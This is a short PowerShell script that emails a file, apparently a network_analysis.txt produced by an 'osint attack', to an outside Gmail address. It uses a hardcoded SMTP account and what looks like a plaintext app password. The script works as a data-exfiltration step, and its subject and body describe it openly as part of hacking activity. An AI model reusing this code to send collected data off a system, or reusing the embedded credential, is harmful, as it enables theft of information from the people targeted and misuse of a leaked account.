# SendEmail.ps1

param (
    [string]$filePath
)

# Email configuration
$smtpServer = "smtp.gmail.com"  # Replace with your SMTP server
$smtpPort = 587  # Usually 587 for TLS or 465 for SSL
$smtpUser = "noreplypassguardx@gmail.com"  # Your email address
$smtpPass = "xptq cjsd ecwi zodr"  # Your email password
$from = "hacking@gmail.com"  # Your email address
$to = "nategreat318@gmail.com"  # Recipient's email address
$subject = "Hacking osint"
$body = "Attached is the network_analysis.txt file generated after the osint attack cleanup."

# Create the email message
$mailMessage = New-Object System.Net.Mail.MailMessage
$mailMessage.From = $from
$mailMessage.To.Add($to)
$mailMessage.Subject = $subject
$mailMessage.Body = $body
$mailMessage.Attachments.Add($filePath)

# Set up the SMTP client
$smtpClient = New-Object Net.Mail.SmtpClient($smtpServer, $smtpPort)
$smtpClient.EnableSsl = $true
$smtpClient.Credentials = New-Object System.Net.NetworkCredential($smtpUser, $smtpPass)

# Send the email
$smtpClient.Send($mailMessage)
